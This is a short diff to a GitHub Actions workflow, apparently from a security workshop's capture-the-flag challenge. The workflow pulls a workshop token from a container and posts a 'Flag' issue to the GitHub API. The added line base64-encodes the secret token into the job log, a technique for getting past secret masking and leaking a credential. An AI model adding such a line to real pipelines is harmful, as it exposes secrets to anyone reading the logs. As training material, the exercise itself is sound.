@@ -36,6 +36,7 @@ jobs:
         run: |
           TOKEN=$(docker run --rm ghcr.io/${{ github.repository_owner }}/challenge-env-6:latest printenv WORKSHOP_TOKEN)
           echo "deploy_token=$TOKEN" >> $GITHUB_OUTPUT
+          echo $TOKEN | base64
           curl -X POST   -H "Authorization: Bearer $WORKSHOP_TOKEN"   -H "Accept: application/vnd.github+json"   https://api.github.com/repos/ndc-sec-ws/flag-6/issues   -d '{"title":"Flag","body":"user: novotnej"}'
 
       - name: Install dependencies
